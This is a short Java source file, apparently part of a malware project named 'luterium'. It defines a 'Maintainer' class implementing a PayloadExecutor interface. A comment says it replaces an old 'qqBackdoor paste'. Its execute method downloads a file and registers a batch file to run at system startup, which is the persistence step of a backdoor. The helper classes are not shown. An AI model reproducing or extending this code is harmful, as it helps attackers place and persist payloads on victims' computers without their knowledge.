package dev.peter.luterium.features.maintainer;

import dev.peter.luterium.payload.PayloadExecutor;

/**
 * @author Peter
 * @since 09/30/2025
 * Completely rewritten, instead of some old qqBackdoor paste :)
 */

public class Maintainer implements PayloadExecutor {
    @Override
    public void execute() throws Exception {
        Downloader.downloadFile(); //Downloads the file.
        Startup.registerToStartup(); //Adds dummy batch file to startup.
    }
}
